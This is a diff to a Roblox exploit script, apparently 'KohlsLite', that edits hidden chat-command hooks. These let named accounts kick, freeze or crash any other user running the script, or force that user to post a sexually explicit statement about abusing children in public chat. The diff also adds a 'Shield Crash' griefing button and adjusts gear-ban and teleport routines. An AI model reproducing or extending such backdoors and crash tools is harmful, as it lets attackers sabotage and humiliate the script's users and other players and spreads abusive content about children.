@@ -5321,13 +5321,14 @@ v.Chatted:Connect(function(msg)
                    Chat('h \n\n\n [KohlsLite]: '..v.Name..', it is sword me, not ;sword!! \n\n\n')
                 end
 		end
+					
 		-- // dev \\ --
 		if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
                         Speak("[KohlsLite]: I use KohlsLite!")
                 end
 
-                if string.sub(msg:lower(), 0, 5) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+                if string.sub(msg:lower(), 0, 4) == "-prc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
 	                 	Speak("[PR Script]: atprog is my daddy fr!")
 			end
                 end
@@ -5338,7 +5339,7 @@ v.Chatted:Connect(function(msg)
 
             
                 if string.sub(msg:lower(), 0, 4) == "-prk" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
 				game.Players.LocalPlayer:Kick("[PR Script]: atprog kicked you from the game!")
 			end
                 end  
@@ -5348,28 +5349,30 @@ v.Chatted:Connect(function(msg)
                 end
 
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "t_echr") then
-                    	if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
-				Remind("[PR Script]: You Have Been Warned!")
+                    	if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+				Remind("[PR Script]: You have been warned!")
 			end
                 end
 
-if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
-	             while true do end
+		if string.sub(msg:lower(), 0, 6) == "-crash" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+	             		while true do end
+				-- game:Shutdown()
 			end
                 end
 
+		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "me_123eq" or v.Name == "me_crashking") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
+	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
+			end
+                end
+					
 		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" and game.Players.LocalPlayer.Name ~= "me_crashking" then
 	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
 			end
                 end
-
-		if string.sub(msg:lower(), 0, 4) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "ScriptingProgrammer" or v.Name == "ScriptingProgrammer") then
-			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
-	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
-			end
-                end
+					
                 end)
 -- ADMIN
             if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
@@ -6032,18 +6035,18 @@ end
 function Dummy()
 			local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
 			Chat("char me 5647726938")
-			task.wait(0.3)
+			task.wait(0.5)
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
 			Chat("face me 8560971")
 			Chat("unpants me")
 			repeat task.wait() until not game.Players.LocalPlayer.Character:FindFirstChildOfClass("Pants")
-			task.wait(0.1)
+			task.wait(0.5)
 			Chat("name me NPC")
 			repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("NPC")
 			Chat("clone me")
-			task.wait()
+			task.wait(0.5)
 			Chat("unchar me")
-			task.wait(0.25)
+			task.wait(0.5)
 			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
 end
 
@@ -6335,7 +6338,7 @@ function FastPads() -- if no touchinterest or idk
                wait(0.01)
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                wait(0.01)
-               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-31.0896435, 8.22999477, 70.522644, -0.999961913, 4.495271e-08, -0.0087288795, 4.55292621e-08, 1, -6.58523618e-08, 0.0087288795, -6.62472743e-08, -0.999961913)
+	       House()
 end
 
 -- GEARBAN
@@ -6393,9 +6396,9 @@ function Rail()
 end
 
 function Ungearban(plrg)
-    game.Players:Chat("ungear me")
-	game.Players:Chat("tp "..plrg.." me")
-	game.Players:Chat("speed "..plrg.." 0")
+        Chat("ungear me")
+	Chat("tp "..plrg.." me")
+	Chat("speed "..plrg.." 0")
 	task.wait(0.5)
         game.Players:Chat('gear me 71037101')
         repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("DaggerOfShatteredDimensions")
@@ -6403,13 +6406,13 @@ function Ungearban(plrg)
         task.wait()
         ungear.Parent = game.Players.LocalPlayer.Character
         task.wait()
-        game.Players.LocalPlayer.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("DaggerOfShatteredDimensions"))
+        game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Character.Backpack:FindFirstChild("DaggerOfShatteredDimensions"))
         task.wait(0.5)
         game.Players.LocalPlayer.Character.DaggerOfShatteredDimensions.Remote:FireServer(Enum.KeyCode.Q)
         task.wait(0.5)
-        game.Players:Chat("ungear me")
+        Chat("ungear me")
+	Chat("speed "..plrg.." 16")
 end
-		-- end)
 
 function StoneMap()
 	Chat("ungear me")
@@ -6769,7 +6772,7 @@ local Window = Rayfield:CreateWindow({
       FileName = "KeyKohlsLite",
       SaveKey = false,
       GrabKeyFromSite = false,
-      Key = {"PC","PC"}
+      Key = {"PC","pc"}
    }
 })
 
@@ -6860,6 +6863,13 @@ local Button = Tab:CreateButton({
    Name = "VG Crash",
    Callback = function()
       VGCrash()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Shield Crash",
+   Callback = function()
+      SCrash()
    end,
 })
 
